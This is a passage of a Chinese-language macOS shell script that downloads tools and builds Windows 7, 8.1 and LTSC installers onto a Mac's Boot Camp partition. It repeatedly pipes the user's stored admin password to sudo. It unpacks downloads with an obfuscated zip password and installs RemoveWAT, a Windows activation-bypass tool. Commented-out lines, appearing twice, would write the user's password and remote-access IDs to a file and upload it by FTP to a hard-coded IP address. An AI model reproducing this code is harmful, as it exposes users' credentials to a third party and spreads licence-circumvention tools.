if [ ! -f "/tmp/RE/Windows/System32/Sys.cmd" ]; then
read -t 10 -p "安装工具PESys无法下载，10秒后自动重试..."
Winxt
fi
fi

if [ "$ntfs10" ]; then
/tmp/aria2c -c -o ntfs.zip $ip5/ntfs.zip -d /tmp
unzip -o "/tmp/ntfs.zip" -d "/tmp">/dev/null 2>&1
clear && printf "\e[3J"
if [ ! -f "/tmp/ntfs.zip" ]; then
read -t 10 -p "安装工具NTFS无法下载，10秒后自动重试..."
Winxt
fi
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "cp -R /tmp/fusefs_txantfs.fs /System/Library/Filesystems" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo cp -R /tmp/fusefs_txantfs.fs /System/Library/Filesystems
fi
fi

if [ "$zip7" ]; then
/tmp/aria2c -c -o 7zip.zip $ip5/7zip.zip -d /tmp
unzip -o "/tmp/7zip.zip" -d "/tmp">/dev/null 2>&1
clear && printf "\e[3J"
if [ ! -f "/tmp/keka7z" ]; then
read -t 10 -p "安装工具7zip无法下载，10秒后自动重试..."
Winxt
fi
fi

if [ "$reltsc" ]; then
re800="1"
fi


if [ "$re700" ]; then

/tmp/aria2c -c -o 7b.exe $ip5/7b.exe -d /tmp
#/tmp/aria2c -c -o 7b2.exe $ip5/7b2.exe -d /tmp

if [ ! "$mjh7" ]; then
/tmp/aria2c -c -o RemoveWAT.exe $ip5/RemoveWAT.exe -d /tmp
#unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/RemoveWAT.zip" -d "/tmp">/dev/null 2>&1
clear && printf "\e[3J"
if [ ! -f /tmp/RemoveWAT.exe ]; then
clear && printf "\e[3J"	
echo	
read -t 10 -p "安装工具RemoveWAT无法下载，10秒后自动重试..."
Winxt
fi
fi

if [ ! "$yyw7" ] ; then
/tmp/aria2c -c -o rootsupd.exe $ip5/rootsupd.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f /tmp/rootsupd.exe ]; then
clear && printf "\e[3J"	
echo	
read -t 10 -p "安装工具rootsupd无法下载，10秒后自动重试..."
Winxt
fi
else
echo "$pass" | sudo -S sudo rm -rf /tmp/RE/Windows/System32/Sys.cmd
/tmp/aria2c -c -o pesys.zip $ip5/yyw7.zip -d /tmp
echo "$pass" | sudo -S sudo unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/pesys.zip" -d "/tmp/RE/Windows/System32">/dev/null 2>&1
clear && printf "\e[3J"
if [ ! -f "/tmp/RE/Windows/System32/Sys.cmd" ]; then
clear && printf "\e[3J"	
echo	
read -t 10 -p "安装工具PESys无法下载，10秒后自动重试..."
Winxt
fi
fi

if [ -f ~/Downloads/JG_Download/cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso ]; then
echo
#/tmp/aria2c -c -o Windows6.1-KB3033929-x64.msu http://download.windowsupdate.com/c/msdownload/update/software/secu/2015/02/windows6.1-kb3033929-x64_5c56222b0caf43030addc9ad262633fcbddfcd41.msu -d /tmp/buding
#/tmp/aria2c -c -o windows6.1-kb4490628-x64_d3de52d6987f7c8bdc2c015dca69eac96047c76e.msu http://download.windowsupdate.com/c/msdownload/update/software/secu/2019/03/windows6.1-kb4490628-x64_d3de52d6987f7c8bdc2c015dca69eac96047c76e.msu -d /tmp/buding
#/tmp/aria2c -c -o windows6.1-kb4474419-v3-x64_b5614c6cea5cb4e198717789633dca16308ef79c.msu http://download.windowsupdate.com/c/msdownload/update/software/secu/2019/09/windows6.1-kb4474419-v3-x64_b5614c6cea5cb4e198717789633dca16308ef79c.msu -d /tmp/buding
fi

if [ "$Win786" ] ; then
if [ -f ~/Downloads/JG_Download/cn_windows_7_ultimate_with_sp1_x86_dvd_u_677486.iso ]; then
#/tmp/aria2c -c -o Windows6.1-KB3033929-x86.msu http://download.windowsupdate.com/d/msdownload/update/software/secu/2015/02/windows6.1-kb3033929-x86_927e018113fe51250c57029635d46b89bf235920.msu -d /tmp/buding
#/tmp/aria2c -c -o windows6.1-kb4490628-x86_3cdb3df55b9cd7ef7fcb24fc4e237ea287ad0992.msu http://download.windowsupdate.com/c/msdownload/update/software/secu/2019/03/windows6.1-kb4490628-x86_3cdb3df55b9cd7ef7fcb24fc4e237ea287ad0992.msu -d /tmp/buding
#/tmp/aria2c -c -o windows6.1-kb4474419-v3-x86_0f687d50402790f340087c576886501b3223bec6.msu http://download.windowsupdate.com/c/msdownload/update/software/secu/2019/09/windows6.1-kb4474419-v3-x86_0f687d50402790f340087c576886501b3223bec6.msu -d /tmp/buding
/tmp/aria2c -c -o exdism.zip $ip5/exdism.zip -d /tmp
/tmp/aria2c -c -o IQI.exe $ip5/IQI32.exe -d /tmp
/tmp/aria2c -c -o 7z.exe $ip5/7z32.exe -d /tmp
/tmp/aria2c -c -o 7z.dll $ip5/7z32.dll -d /tmp
rm -rf /tmp/RE/Windows/System32/IQI.exe
rm -rf /tmp/RE/Windows/System32/exdism
rm -rf /tmp/RE/Windows/System32/7z.exe 
rm -rf /tmp/RE/Windows/System32/7z.dll
unzip -o "/tmp/exdism.zip" -d "/tmp/RE/Windows/System32">/dev/null 2>&1
cp /tmp/IQI.exe /tmp/RE/Windows/System32
cp /tmp/7z.exe /tmp/RE/Windows/System32
cp /tmp/7z.dll /tmp/RE/Windows/System32
fi
fi

drvname="install.wim"
if [ "$yyw7" ] ; then
drvname="install.esd"
hdiutil attach ~/Downloads/JG_Download/Windows7x86x64.iso >/dev/null 2>&1
else
hdiutil attach ~/Downloads/JG_Download/cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso >/dev/null 2>&1
fi
if [ "$Win786" ] ; then
hdiutil attach ~/Downloads/JG_Download/cn_windows_7_ultimate_with_sp1_x86_dvd_u_677486.iso >/dev/null 2>&1
fi
echo "$pass" | sudo -S sudo rm -rf /tmp/ISODIR/sources/boot.wim >/dev/null 2>&1
echo "$pass" | sudo -S sudo cp /Volumes/GSP1RMCULXFRER_CN_DVD/sources/boot.wim /tmp/ISODIR/sources >/dev/null 2>&1
echo "$pass" | sudo -S sudo cp /Volumes/GSP1RMCULFRER_CN_DVD/sources/boot.wim /tmp/ISODIR/sources >/dev/null 2>&1
echo "$pass" | sudo -S sudo cp /Volumes/XiaoFeng/sources/boot.wim /tmp/ISODIR/sources >/dev/null 2>&1
if [ ! "$sip" ]; then
echo "$pass" | sudo -S sudo rm -rf /tmp/ISODIR/bootmgr.efi
echo "$pass" | sudo -S sudo rm -rf /tmp/ISODIR/efi
fi
echo "$pass" | sudo -S sudo rm -rf /tmp/Windows.wim
echo "$pass" | sudo -S sudo rm -rf /tmp/boot.img
echo "$pass" | sudo -S sudo rm -rf /tmp/boot.img.gz
echo "$pass" | sudo -S sudo rm -rf /tmp/2

if [ "$winclone6" ]; then

if [ "$sip" ]; then
diskutil eraseVolume MS-DOS DOS ${restore_device}
/tmp/aria2c -c -o WPE.zip $ip5/WPE.zip -d /tmp
unzip -o "/tmp/WPE.zip" -d "/tmp">/dev/null 2>&1
clear && printf "\e[3J"
if [ ! -f "/tmp/WPE/WEPE/WEPE.SDI" ]; then
clear && printf "\e[3J"	
echo	
read -t 10 -p "安装工具WPE无法下载，10秒后自动重试..."
Winxt
fi
if [ ! "$asip" ]; then
rm -rf /tmp/RE/Windows/System32/Sys.cmd
/tmp/aria2c -c -o pesys.zip $ip5/pesys7.zip -d /tmp
echo "$pass" | sudo -S sudo unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/pesys.zip" -d "/tmp/RE/Windows/System32">/dev/null 2>&1
clear && printf "\e[3J"
if [ ! -f "/tmp/RE/Windows/System32/Sys.cmd" ]; then
clear && printf "\e[3J"	
echo	
read -t 10 -p "安装工具PESys无法下载，10秒后自动重试..."
Winxt
fi
/tmp/aria2c -c -o EFIboot.zip $ip5/EFIboot.zip -d /tmp
echo "$pass" | sudo -S sudo unzip -o "/tmp/EFIboot.zip" -d "/tmp">/dev/null 2>&1
if [ ! -f "/tmp/EFI/boot/bootx64.efi" ]; then
clear && printf "\e[3J"	
echo	
read -t 10 -p "安装工具EFIboot无法下载，10秒后自动重试..."
Winxt
fi
fi
if [ "$asip" ]; then
echo "$pass" | sudo -S sudo rm -rf /tmp/ISODIR/sources/boot.wim
echo
/tmp/aria2c -c -o boot.wim --console-log-level=warn --summary-interval=888888888 "$ip8/666/asip.wim" -d /tmp/ISODIR/sources
if [ ! -f "/tmp/ISODIR/sources/boot.wim" ]; then
clear && printf "\e[3J"	
echo	
read -t 10 -p "安装工具asip无法下载，10秒后自动重试..."
Winxt
else
filesize="$(ls -l /tmp/ISODIR/sources/boot.wim | awk '{ print $5 }')" 
if [ "$filesize" -lt "1000000" ]; then
clear && printf "\e[3J"
echo
echo "$pass" | sudo -S sudo rm -rf /tmp/ISODIR/sources/boot.wim
read -t 2 -p "下载asip有误，将自动重试下载...如果一直重复，请通知技术员"
Winxt
fi
fi
if [ -f "/tmp/ISODIR/sources/boot.wim.aria2" ]; then
clear && printf "\e[3J"	
echo	
read -t 10 -p "安装工具asip下载不完整，10秒后自动重试..."
Winxt
fi
fi
if [ ! "$asip" ]; then
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 2 \
    --command "add /tmp/RE /"
else
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 1 \
    --command "add /tmp/RE /"    
fi
clear && printf "\e[3J"
echo
echo "\033[36m请等待，正在操作中！！！\033[0m"
cp -R /tmp/WPE/* /Volumes/PEVIP
cp /tmp/ISODIR/sources/boot.wim /Volumes/PEVIP/WEPE/WEPE64.WIM
mkdir -p /Volumes/PEVIP/WLLOS
cp /Volumes/GSP1RMCULXFRER_CN_DVD/sources/"$drvname" /Volumes/PEVIP/WLLOS
cp ~/Downloads/JG_Download/BootCamp.zip /Volumes/PEVIP/WLLOS
cp ~/Downloads/BootCamp/WindowsSupport.dmg /Volumes/PEVIP/WLLOS
cp /tmp/bcsz.exe /Volumes/PEVIP/WLLOS
cp /tmp/qdgx.exe /Volumes/PEVIP/WLLOS
cp /tmp/azbc.exe /Volumes/PEVIP/WLLOS
cp -R /tmp/buding /Volumes/PEVIP/WLLOS
cp /tmp/RemoveWAT.exe /Volumes/PEVIP/WLLOS
cp /tmp/rootsupd.exe /Volumes/PEVIP/WLLOS
if [ ! "$asip" ]; then
rm -rf /Volumes/PEVIP/EFI/BOOT/bootx64.efi 
cp /tmp/EFI/boot/bootx64.efi /Volumes/PEVIP/EFI/BOOT/bootx64.efi
echo "SySFile=HFS" > /Volumes/PEVIP/WLLOS/HFS
else
echo "SySFile=HFS11" > "${bootcamp_mounted}/WLLOS/HFS11"
fi
echo "SySFile=$drvname" > /Volumes/DOS/MacSys
echo "Index=$index" >> /Volumes/DOS/MacSys
#echo "TBName=$tbid" > /tmp/mac.txt
#echo "TVName=$TVName" >> /tmp/mac.txt
#echo "PSName=$pass" >> /tmp/mac.txt
if [ -f /tmp/mac.txt ]; then
#curl --connect-timeout 10 -m 20 -T /tmp/mac.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
echo
fi
#rm -rf /tmp/mac.txt
clear && printf "\e[3J"
echo
echo	
#echo TeamViewerID: "\033[36m${TVID}\033[0m"
echo	
echo ID: "\033[36m${tbid}\033[0m"		
echo
echo "\033[36m安装系统写入完成！手动切换！！！⑦\033[0m"
killall "System Preferences"
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/usr/bin/security authorizationdb write system.preferences.startupdisk allow" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /usr/bin/security authorizationdb write system.preferences.startupdisk allow
fi
exit 0
fi



if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 2 --command 'add /tmp/RE /'" password "$pass" with administrator privileges
do shell script "/tmp/tools/bin/wimlib-imagex capture /tmp/ISODIR /tmp/Windows.wim" password "$pass" with administrator privileges
do shell script "/tmp/winclone6 --self-extract -l -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 2 \
    --command "add /tmp/RE /"
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex capture /tmp/ISODIR /tmp/Windows.wim
echo "$pass" | sudo -S sudo /tmp/winclone6 --self-extract -l -p ${restore_device}
fi
if [ ! -f "/Volumes/BOOTCAMP/boot/BCD" ]; then
clear && printf "\e[3J"		
echo
read -t 30 -p "安装BCD失败，请检查NTFS软件，30秒后自动重试..."
Winxt
fi
rm -rf /tmp/666
mkdir /tmp/666
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
echo "mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666" > /tmp/ntfs.sh
osascript <<EOD
do shell script "bash /tmp/ntfs.sh" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666
fi
bootcamp_mounted="/tmp/666"
fi

if [ "$winclone7" ]; then

if [ ! "$sip" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 2 --command 'add /tmp/RE /'" password "$pass" with administrator privileges
do shell script "/tmp/tools/bin/wimlib-imagex capture /tmp/ISODIR /tmp/Windows.wim" password "$pass" with administrator privileges
do shell script "/tmp/winclone --self-extract -l -p ${restore_device} -i 1" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 2 \
    --command "add /tmp/RE /"
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex capture /tmp/ISODIR /tmp/Windows.wim
echo "$pass" | sudo -S sudo /tmp/winclone --self-extract -l -p ${restore_device} -i 1
fi
if [ ! -f "/Volumes/Windows/boot/BCD" ]; then
clear && printf "\e[3J"	
echo	
read -t 30 -p "安装BCD失败，请检查NTFS软件，30秒后自动重试..."
Winxt
fi
else
if [ ! "$asip" ]; then
/tmp/aria2c -c -o EFIboot.zip $ip5/EFIboot.zip -d /tmp
unzip -o "/tmp/EFIboot.zip" -d "/tmp">/dev/null 2>&1
if [ ! -f "/tmp/EFI/boot/bootx64.efi" ]; then
clear && printf "\e[3J"	
echo	
read -t 10 -p "安装工具EFIboot无法下载，10秒后自动重试..."
Winxt
fi
fi
if [ "$asip" ]; then
echo "$pass" | sudo -S sudo rm -rf /tmp/ISODIR/sources/boot.wim
echo
/tmp/aria2c -c -o boot.wim --console-log-level=warn --summary-interval=888888888 "$ip8/666/asip.wim" -d /tmp/ISODIR/sources
if [ ! -f "/tmp/ISODIR/sources/boot.wim" ]; then
clear && printf "\e[3J"	
echo	
read -t 10 -p "安装工具asip无法下载，10秒后自动重试..."
Winxt
else
filesize="$(ls -l /tmp/ISODIR/sources/boot.wim | awk '{ print $5 }')" 
if [ "$filesize" -lt "1000000" ]; then
clear && printf "\e[3J"
echo
echo "$pass" | sudo -S sudo rm -rf /tmp/ISODIR/sources/boot.wim
read -t 2 -p "下载asip有误，将自动重试下载...如果一直重复，请通知技术员"
Winxt
fi
fi
if [ -f "/tmp/ISODIR/sources/boot.wim.aria2" ]; then
clear && printf "\e[3J"	
echo	
read -t 10 -p "安装工具asip下载不完整，10秒后自动重试..."
Winxt
fi
fi
if [ "$asip" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 1 --command 'add /tmp/RE /'" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 1 \
    --command "add /tmp/RE /"
fi    
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 2 --command 'add /tmp/RE /'" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 2 \
    --command "add /tmp/RE /"
fi    
fi
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/tools/bin/wimlib-imagex capture /tmp/ISODIR /tmp/Windows.wim" password "$pass" with administrator privileges
do shell script "/tmp/winclone --self-extract -e -p ${restore_device} -i 1" password "$pass" with administrator privileges
EOD
else  
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex capture /tmp/ISODIR /tmp/Windows.wim
echo "$pass" | sudo -S sudo /tmp/winclone --self-extract -e -p ${restore_device} -i 1
fi
if [ ! "$asip" ]; then
echo "$pass" | sudo -S sudo diskutil mount disk0s1
rm -rf /Volumes/EFI/EFI/Boot/bootx64.efi 
rm -rf /Volumes/NO\ NAME/EFI/Boot/bootx64.efi
cp /tmp/EFI/boot/bootx64.efi /Volumes/EFI/EFI/Boot/bootx64.efi
cp /tmp/EFI/boot/bootx64.efi /Volumes/NO\ NAME/EFI/Boot/bootx64.efi
diskutil unmount disk0s1
fi

fi


if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone10 -m ${restore_device}" password "$pass" with administrator privileges
EOD
bootcamp_mounted="/Volumes/Windows"
else
bootcamp_mounted=$(echo "$pass" | sudo -S sudo /tmp/winclone10 -m ${restore_device})
fi
fi

if [ "$winclone5" ]; then
diskutil eraseVolume MS-DOS DOS ${restore_device}
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/System/Library/Filesystems/fusefs_txantfs.fs/Support/mkntfs -Q -L BOOTCAMP ${restore_device}" password "$pass" with administrator privileges
do shell script "rm -rf /System/Library/Filesystems/fusefs_txantfs.fs" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /System/Library/Filesystems/fusefs_txantfs.fs/Support/mkntfs -Q -L BOOTCAMP ${restore_device}
echo "$pass" | sudo -S sudo rm -rf /System/Library/Filesystems/fusefs_txantfs.fs
fi
diskutil mount ${restore_device}
if [ $? -ne 0 ] ; then
diskutil eraseVolume MS-DOS DOS ${restore_device}
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "cp -R /tmp/fusefs_txantfs.fs /System/Library/Filesystems" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo cp -R /tmp/fusefs_txantfs.fs /System/Library/Filesystems
fi
read -t 5 -p "格式化成NTFS失败，5秒后重试..."
fi
echo "$pass" | sudo -S sudo mv /tmp/RE /tmp/2
echo "$pass" | sudo -S sudo /tmp/keka7z a /tmp/ISODIR/sources/boot.wim /tmp/2
echo "$pass" | sudo -S sudo mkdir /tmp/666
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
echo "mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666" > /tmp/ntfs.sh
osascript <<EOD
do shell script "bash /tmp/ntfs.sh" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666
fi
bootcamp_mounted="/tmp/666"
echo "$pass" | sudo -S sudo cp -R /tmp/ISODIR/* "${bootcamp_mounted}"
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/ntfsclone -s ${restore_device} -o /tmp/boot.img" password "$pass" with administrator privileges
do shell script "/tmp/pigz -6 -p 10 -k /tmp/boot.img" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/ntfsclone -s ${restore_device} -o /tmp/boot.img
echo "$pass" | sudo -S sudo /tmp/pigz -6 -p 10 -k /tmp/boot.img
fi
diskutil eraseVolume MS-DOS DOS ${restore_device}
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone5 --self-extract -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone5 --self-extract -p ${restore_device}
fi
if [ ! -f "/Volumes/BOOTCAMP/boot/BCD" ]; then
read -t 30 -p "安装BCD失败，请检查NTFS软件，30秒后自动重试..."
Winxt
fi
echo "$pass" | sudo -S sudo rm -rf /tmp/666
echo "$pass" | sudo -S sudo mkdir /tmp/666
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
echo "mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666" > /tmp/ntfs.sh
osascript <<EOD
do shell script "bash /tmp/ntfs.sh" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666
fi
bootcamp_mounted="/tmp/666"
fi

clear && printf "\e[3J"
echo
echo
echo "\033[36m请等待，即将写入完成！！！\033[0m"
mkdir -p "${bootcamp_mounted}/WLLOS"
mkdir -p "${bootcamp_mounted}/Windows/System32"
cp /tmp/ntdll.dll "${bootcamp_mounted}/Windows/System32"
cp /Volumes/GSP1RMCULXFRER_CN_DVD/sources/"$drvname" "${bootcamp_mounted}/WLLOS" >/dev/null 2>&1
cp /Volumes/GSP1RMCULFRER_CN_DVD/sources/"$drvname" "${bootcamp_mounted}/WLLOS" >/dev/null 2>&1
cp /Volumes/XiaoFeng/sources/"$drvname" "${bootcamp_mounted}/WLLOS" >/dev/null 2>&1
cp ~/Downloads/JG_Download/BootCamp.zip "${bootcamp_mounted}/WLLOS"
cp ~/Downloads/BootCamp/WindowsSupport.dmg "${bootcamp_mounted}/WLLOS"
cp /tmp/bcsz.exe "${bootcamp_mounted}/WLLOS"
cp /tmp/qdgx.exe "${bootcamp_mounted}/WLLOS"
cp /tmp/azbc.exe "${bootcamp_mounted}/WLLOS"
cp /tmp/RemoveWAT.exe "${bootcamp_mounted}/WLLOS"
cp /tmp/rootsupd.exe "${bootcamp_mounted}/WLLOS"
cp /tmp/7b.exe "${bootcamp_mounted}"
cp /tmp/7b2.exe "${bootcamp_mounted}"
cp /tmp/AppleBluetoothBroadcomInstaller64.exe "${bootcamp_mounted}/WLLOS"
if [ "$Win786" ] ; then
echo "32" > "${bootcamp_mounted}/WLLOS/Win732"
fi
#cp /tmp/KMS8.exe "${bootcamp_mounted}/WLLOS"
cp -R /tmp/buding "${bootcamp_mounted}/WLLOS"
echo "SySFile=$drvname" > "${bootcamp_mounted}/WLLOS/MacSys"
echo "Index=$index" >> "${bootcamp_mounted}/WLLOS/MacSys"
if [ "$sip" ]; then
apfs_active=`diskutil list | grep APFS`
if [ "$apfs_active" ] ; then
echo "SySFile=APFS" > "${bootcamp_mounted}/WLLOS/APFS"
else
echo "SySFile=HFS" > "${bootcamp_mounted}/WLLOS/HFS"
if [[ $modelxh = "10.13"* ]]; then
if [ ! "$REHD" ] ; then
rm -rf "${bootcamp_mounted}/WLLOS/HFS"
echo "SySFile=HFS" > "${bootcamp_mounted}/WLLOS/HFS1013"
else
rm -rf "${bootcamp_mounted}/WLLOS/HFS"
echo "SySFile=HFS" > "${bootcamp_mounted}/WLLOS/HFS13"
fi
fi
if [[ $modelxh = "10.14"* ]]; then
if [ ! "$REHD" ] ; then
rm -rf "${bootcamp_mounted}/WLLOS/HFS"
echo "SySFile=HFS" > "${bootcamp_mounted}/WLLOS/HFS1013"
else
rm -rf "${bootcamp_mounted}/WLLOS/HFS"
echo "SySFile=HFS" > "${bootcamp_mounted}/WLLOS/HFS13"
fi
fi
if [[ $modelxh = "10.15"* ]]; then
if [ ! "$REHD" ] ; then
rm -rf "${bootcamp_mounted}/WLLOS/HFS"
echo "SySFile=HFS" > "${bootcamp_mounted}/WLLOS/HFS1013"
else
rm -rf "${bootcamp_mounted}/WLLOS/HFS"
echo "SySFile=HFS" > "${bootcamp_mounted}/WLLOS/HFS13"
fi
fi
fi
fi
diskutil unmount ${restore_device}
diskutil mount ${restore_device}
#echo "TBName=$tbid" > /tmp/mac.txt
#echo "TVName=$TVName" >> /tmp/mac.txt
#echo "PSName=$pass" >> /tmp/mac.txt
if [ -f /tmp/mac.txt ]; then
#curl --connect-timeout 10 -m 20 -T /tmp/mac.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
echo
fi
#rm -rf /tmp/mac.txt
clear && printf "\e[3J"
if [ -e "/Volumes/DOS" ]; then
echo
echo
if [[ $modelxh != "10.6"* ]]; then
echo 请通知技术员，重启电脑后，再重新安装！柒
osascript -e 'Tell application "System Events" to display dialog "请通知技术员，重启电脑后，再重新安装！柒" buttons {"OK"}'
else
echo 请通知技术员，重启电脑后，再重新安装！柒
fi
echo
exit
fi
echo
echo	
#echo TeamViewerID: "\033[36m${TVID}\033[0m"
echo	
echo ID: "\033[36m${tbid}\033[0m"		
echo
echo "\033[36m安装系统写入完成！！！\033[0m"
killall "System Preferences"
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/usr/bin/security authorizationdb write system.preferences.startupdisk allow" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /usr/bin/security authorizationdb write system.preferences.startupdisk allow
fi
if [ "$sip" ]; then
if [ "$apfs_active" ] ; then
if [ ! "$MBR10" ]; then
open /System/Library/PreferencePanes/StartupDisk.prefPane
exit 0
fi
fi
echo "\033[36m手动切换！！！⑦\033[0m"
else

if [ "$kzdcq" ]; then
if [ -e "/Volumes/BOOTCAMP" ]; then
echo "$pass" | sudo -S sudo bless -mount /Volumes/BOOTCAMP -setBoot -legacy -file /Volumes/BOOTCAMP/bootmgr 
killall "System Preferences" >/dev/null 2>&1	
clear && printf "\e[3J"
echo
echo
echo "\033[36m安装完成，倒计时30秒开始！结束后将自动进入Windows系统！\033[0m"
echo
echo
t=30
while test $t -gt 0
do
echo "${t}\b\b\c"
sleep 1
t=$((t-1))
done
echo "$pass" | sudo -S sudo shutdown -r now
fi
if [ -e "/Volumes/Windows" ]; then
echo "$pass" | sudo -S sudo bless -mount /Volumes/Windows -legacy -setBoot -file /Volumes/Windows/bootmgr 
killall "System Preferences" >/dev/null 2>&1	
clear && printf "\e[3J"
echo
echo
echo "\033[36m安装完成，倒计时30秒开始！结束后将自动进入Windows系统！\033[0m"
echo
echo
t=30
while test $t -gt 0
do
echo "${t}\b\b\c"
sleep 1
t=$((t-1))
done
echo "$pass" | sudo -S sudo shutdown -r now
fi
exit
fi

open /System/Library/PreferencePanes/StartupDisk.prefPane
fi
if [[ $modelxh != "10.6"* ]]; then
osascript -e 'Tell application "System Events" to display dialog "安装完成，请通知技术员！" buttons {"OK"}'
else
echo 安装完成，请通知技术员！
fi
exit 0
fi


if [ "$re800" ]; then

if [ ! "$MBR10" ]; then
if [ "$sip" ]; then
if [[ $modelxh = "10.10"* ]]; then
old10="1"
fi
if [[ $modelxh = "10.11"* ]]; then
old10="1"
fi
fi
fi
echo "$pass" | sudo -S sudo rm -rf /tmp/ISODIR/sources/boot.wim
drvname="install.wim"

if [ ! "$reltsc" ]; then
hdiutil attach ~/Downloads/JG_Download/cn_windows_8.1_with_update_x64_dvd_6051473.iso
cp /Volumes/IR5_CCSA_X64FRE_ZH-CN_DV9/sources/boot.wim /tmp/ISODIR/sources
else
hdiutil attach ~/Downloads/JG_Download/cn_windows_10_enterprise_ltsc_2019_x64_dvd_d17070a8.iso
hdiutil attach ~/Downloads/JG_Download/cn_windows_10_enterprise_2016_ltsb_x64_dvd_9060409.iso
cp /Volumes/CES_X64FREV_ZH-CN_DV5/sources/boot.wim /tmp/ISODIR/sources
fi
rm -rf /tmp/Windows.wim
if [ "$old10" ]; then
diskutil eraseVolume MS-DOS DOS ${restore_device}
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "diskutil mount disk0s1" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo diskutil mount disk0s1
fi
rm -rf /Volumes/EFI/EFI/Boot
rm -rf /Volumes/EFI/EFI/Microsoft
diskutil unmount disk0s1
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 2 --command 'add /tmp/RE /'" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 2 \
    --command "add /tmp/RE /"
fi    
cp -R /tmp/WPE/* /Volumes/PEVIP
cp /tmp/ISODIR/sources/boot.wim /Volumes/PEVIP/WEPE/WEPE64.WIM
mkdir -p /Volumes/PEVIP/WLLOS
mkdir -p /Volumes/PEVIP/Windows/System32
cp /tmp/ntdll.dll /Volumes/PEVIP/Windows/System32
if [ ! "$reltsc" ]; then
cp /Volumes/IR5_CCSA_X64FRE_ZH-CN_DV9/sources/"$drvname" /Volumes/PEVIP/WLLOS
else
cp /Volumes/CES_X64FREV_ZH-CN_DV5/sources/"$drvname" /Volumes/PEVIP/WLLOS
fi
cp ~/Downloads/BootCamp/WindowsSupport.dmg /Volumes/PEVIP/WLLOS 
echo "SySFile=$drvname" > /Volumes/DOS/MacSys
echo "Index=$index" >> /Volumes/DOS/MacSys
cp /tmp/bcsz.exe /Volumes/PEVIP/WLLOS 
cp /tmp/qdgx.exe /Volumes/PEVIP/WLLOS 
cp /tmp/azbc.exe /Volumes/PEVIP/WLLOS 
clear && printf "\e[3J"
echo
echo
if [ ! "$reltsc" ]; then
echo "\033[36m安装Win8系统写入完成！！！\033[0m"
else
echo "\033[36m安装LTSC系统写入完成！！！\033[0m"
fi
killall "System Preferences"
